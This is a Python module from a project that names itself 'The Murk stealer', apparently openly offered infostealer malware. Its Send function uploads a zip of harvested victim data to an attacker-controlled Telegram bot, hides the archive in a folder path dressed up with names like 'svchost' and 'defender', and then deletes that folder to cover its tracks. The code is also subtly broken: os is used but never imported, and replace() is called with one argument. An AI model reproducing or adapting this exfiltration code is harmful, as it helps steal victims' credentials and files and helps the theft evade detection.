#-----------------------------------------------------------------------------#
#████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗#
#╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝#
#░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░#
#░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░#
#░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗#
#░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝#
#                        by: Nick_Vinesmoke                                   #
#                 https://github.com/Nick-Vinesmoke                           #
#         https://github.com/Nick-Vinesmoke/The-Murk-stealer                  #
#-----------------------------------------------------------------------------#
import requests
import shutil


def Send(userTOKEN,userCHAT_ID):

	try:
		user = os.environ['USERPROFILE'].replace("C\\Users\\")
	except:
		user = 'The murk'
	archiveOfLogs = rf'windows__cache__\svchost\defender\daksldjlas\dsadsad\sd\dsa\ds\ds\ds\as\dsa\das\ds\sad\das\das\das\dsa\dsa\dsa\das\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\{user}-results.zip'
	userUrl = f'https://api.telegram.org/bot{userTOKEN}/sendDocument?chat_id={userCHAT_ID}'
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
	}
	try:
	    with requests.Session() as session:
	        session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
	        session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
	        session.post(userUrl,files={"document": open(archiveOfLogs, 'rb')})
	except Exception as e:
	    print(e)

	try:
		shutil.rmtree('windows__cache__\\', ignore_errors=True)
	except Exception as e:
		print(e)